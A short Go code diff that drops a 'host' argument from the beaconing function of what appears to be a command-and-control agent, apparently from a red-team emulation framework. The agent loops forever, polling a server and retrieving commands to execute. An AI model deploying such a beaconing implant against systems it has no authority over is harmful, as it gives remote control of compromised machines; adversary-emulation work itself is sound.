@@ -13,9 +13,9 @@ import (
 
 var beacon = 60
 
-func stayInTouch(server string, host string, paw string, group string, files string) {
+func stayInTouch(server string, paw string, group string, files string) {
 	fmt.Println("[+] Beaconing")
-	commands := modules.Beacon(server, paw, host, group, files)
+	commands := modules.Beacon(server, paw, group, files)
 	if commands != nil && len(commands.([]interface{})) > 0 {
 		cmds := reflect.ValueOf(commands)
 		for i := 0; i < cmds.Len(); i++ {
@@ -46,6 +46,6 @@ func main() {
 		group = os.Args[2]	
 	} 
 	for {
-		stayInTouch(server, host, paw, group, files)
+		stayInTouch(server, paw, group, files)
 	}
 }
